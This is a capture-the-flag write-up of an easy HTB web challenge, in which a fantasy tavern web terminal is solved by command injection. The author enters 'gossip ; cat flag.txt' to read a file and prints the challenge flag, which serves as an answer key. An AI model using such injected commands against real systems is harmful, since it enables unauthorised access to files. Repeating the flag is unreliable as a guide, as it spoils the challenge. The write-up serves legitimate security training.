# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Whispers of the Moonbeam
> In the heart of Valeria's bustling capital, the Moonbeam Tavern stands as a lively hub of whispers, wagers, and illicit dealings. Beneath the laughter of drunken patrons and the clinking of tankards, it is said that the tavern harbors more than just ale and merriment—it is a covert meeting ground for spies, thieves, and those loyal to Malakar's cause. The Fellowship has learned that within the hidden backrooms of the Moonbeam Tavern, a crucial piece of information is being traded—the location of the Shadow Veil Cartographer, an informant who possesses a long-lost map detailing Malakar’s stronghold defenses. If the fellowship is to stand any chance of breaching the Obsidian Citadel, they must obtain this map before it falls into enemy hands.


- **Category**: Web 
- **Difficulty**: Very Easy
- **Author**: Ventilatore


## Writeup


website with a terminal
```bash
🏰 Welcome to the tavern! Type "help" for available commands.
```
help
```bash
gossip - 📜 Listen to tavern whispers & rumors
observe - 👀 Survey the patrons & surroundings
examine - 🪞 Reflect upon your identity
help - 📖 Review the available commands
clear - 🧹 Wipe the slate clean
start - 🎲 Begin a game of chance or skill
```
gossip
```bash
🏴‍☠️ 'A merchant returned from Umbar with strange trinkets and fearful tales... things best left unsaid.'
📜 'A dark power stirs in the East... whispers of an ancient evil.'
🕯️ 'The White Council gathers in secret... what could they be planning?'
🐴 'Riders in black were seen near Bree... silent as the grave.'
🍺 'A knight in exile drinks alone, his past too heavy to share... only the bottom of his tankard listens.'

eslint.config.js
flag.txt
index.html
node_modules
package.json
postcss.config.js
public
server
src
tailwind.config.js
tsconfig.app.json
tsconfig.json
tsconfig.node.json
vite.config.ts
yarn.lock
```

cat flag.txt doesn't work

This sentence is written on the web page
```bash
Tip: Use ↑↓ for history, Tab for completion, ; for command injection
```

so but doing a random command with ; cat flag.txt
we get the flag
```bash
gossip ; cat flag.txt
```

>HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_d3ffb51e6ccadac4dd46aefbc0a54ca1}